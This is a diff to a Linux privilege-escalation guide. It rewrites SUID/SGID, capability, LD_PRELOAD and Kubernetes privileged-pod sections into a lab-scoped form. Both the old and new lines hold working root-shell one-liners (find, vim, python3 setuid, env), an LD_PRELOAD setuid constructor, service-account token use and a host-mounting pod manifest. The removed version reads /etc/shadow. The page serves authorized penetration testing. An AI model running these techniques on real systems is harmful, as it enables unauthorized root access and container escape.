@@ -11,6 +11,9 @@ tags:
 
 # Linux Privilege Escalation
 
+!!! note "What this page is doing"
+    Start with the current UID, groups, capabilities, mounts and writable paths. Validate deterministic permission mistakes before considering a kernel exploit, and use a harmless marker or a lab snapshot so the before/after context is clear.
+
 ---
 
 ## 1. Enumeration (Run These First)
@@ -44,40 +47,58 @@ pspy64 -pf -i 1000 # Watch processes/cron without root (SUPER valuable)
 ## 2. SUID / SGID & Capabilities
 
 ```bash
-# --- Find SUID / SGID binaries ---
-find / -perm -4000 -type f 2>/dev/null # SUID
-find / -perm -2000 -type f 2>/dev/null # SGID
-find / -perm -6000 -type f 2>/dev/null # Both
-# --- Cross-check against GTFOBins for an instant root shell ---
-# https://gtfobins.github.io/
-# e.g. /usr/bin/find:
+# Find SUID and SGID binaries. Review each result and its owner before use.
+find / -xdev -perm -4000 -type f 2>/dev/null  # SUID
+find / -xdev -perm -2000 -type f 2>/dev/null  # SGID
+find / -xdev -perm -6000 -type f 2>/dev/null  # both bits
+
+# Find file capabilities, then compare only interesting binaries with GTFOBins.
+getcap -r / 2>/dev/null
+sudo -l
+
+# Lab-only examples when the exact binary is confirmed as a permitted path.
 find . -exec /bin/sh -p \; -quit
-# e.g. /usr/bin/vim:
 vim -c ':!/bin/sh'
-# e.g. /usr/bin/python3:
 python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
-# e.g. /usr/bin/nmap (older, interactive mode):
-nmap --interactive -> !sh
-# e.g. /usr/bin/env:
 env /bin/sh -p
-# --- LD_PRELOAD exploit (if a SUID binary keeps env vars, check `strings`) ---
-cat > /tmp/pe.c << 'EOF'
-#include <stdio.h>
+
+# An older Nmap build may expose an interactive mode; run the binary first.
+nmap --interactive
+```
+
+The last command opens an interactive prompt only on versions that support it. Keep the prompt input separate from shell commands:
+
+```text
+# Example interactive input on an approved lab binary:
+nmap> !sh
+```
+
+If `sudo -l` shows `env_keep+=LD_PRELOAD`, verify the exact permitted command before building a lab proof. Keep the C source, compiler command and execution command in separate blocks so the language and expected result are unambiguous:
+
+```c
+/* Lab proof: a constructor that records the effective UID change. */
 #include <stdlib.h>
 #include <unistd.h>
-__attribute__((constructor)) void pwn(void) { setuid(0); setgid(0); system("/bin/bash -p"); }
-EOF
-gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c
-sudo -l # Look for: env_keep+=LD_PRELOAD
-LD_PRELOAD=/tmp/pe.so /usr/bin/sudo /bin/ls # or the SUID binary from sudo -l
-# --- Capabilities (often overlooked, extremely powerful) ---
-getcap -r / 2>/dev/null
-# cap_setuid+ep on python/perl/ruby/node -> instant root:
-/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
-# cap_dac_read_search => read /etc/shadow
-# cap_net_raw+ep => packet sniffing / ARP spoofing
-# cap_sys_admin+ep => mount, container escape
-# cap_setfcap+ep => set capabilities on your own binary
+
+__attribute__((constructor))
+static void proof(void) {
+    setuid(0);
+    setgid(0);
+    system("/usr/bin/id > /tmp/authorized-lab-marker");
+}
+```
+
+```bash
+# Compile the lab proof as a position-independent shared object.
+gcc -fPIC -shared -o /tmp/privilege-proof.so /tmp/privilege-proof.c
+
+# Use LD_PRELOAD only with the exact command allowed by sudo and only in scope.
+sudo -l
+LD_PRELOAD=/tmp/privilege-proof.so /usr/bin/<PERMITTED_COMMAND>
+
+# Inspect the marker, then remove both artifacts during cleanup.
+cat /tmp/authorized-lab-marker
+rm -f /tmp/authorized-lab-marker /tmp/privilege-proof.so
 ```
 
 ---
@@ -201,20 +222,10 @@ sh -c "echo \$\$ > $d/cgroup.procs"
 ls -la /var/run/secrets/kubernetes.io/serviceaccount/
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 kubectl --token=$TOKEN auth can-i --list
-# Then: create a privileged pod -> mount host root -> pwn the node
-kubectl --token=$TOKEN apply -f - << 'EOF'
-apiVersion: v1
-kind: Pod
-metadata:
-  name: pwn
-spec:
-  containers:
-  - name: pwn
-    image: alpine
-    command: ["/bin/sh","-c","cat /host/etc/shadow"]
-    volumeMounts: [{name: host, mountPath: /host}]
-  volumes: [{name: host, hostPath: {path: /}}]
-EOF
+# Apply a reviewed lab manifest only when the ROE explicitly includes a
+# privileged-pod test. The manifest below reads a non-sensitive host marker.
+kubectl --token="$TOKEN" apply -f privileged-pod.yaml
+
 # --- Other escape vectors ---
 # - nsenter with host PID namespace: nsenter -t 1 -m -u -i -n -p -- bash
 # - /proc/sys/kernel/core_pattern abuse (privileged container)
@@ -222,6 +233,28 @@ EOF
 # - runc CVE-2024-21626 (Leaky Vessels) / CVE-2019-5736 (runc overwrite)
 # - /dev/kmsg or /sys/fs/cgroup writes from a privileged container
 ```
+
+```yaml
+# privileged-pod.yaml — lab-only canary manifest.
+apiVersion: v1
+kind: Pod
+metadata:
+  name: approved-host-marker
+spec:
+  containers:
+    - name: marker
+      image: alpine
+      command: ["/bin/sh", "-c", "cat /host/etc/hostname"]
+      volumeMounts:
+        - name: host
+          mountPath: /host
+  volumes:
+    - name: host
+      hostPath:
+        path: /
+```
+
+Remove the pod and any generated evidence as soon as the approved validation is complete.
 
 ---
 
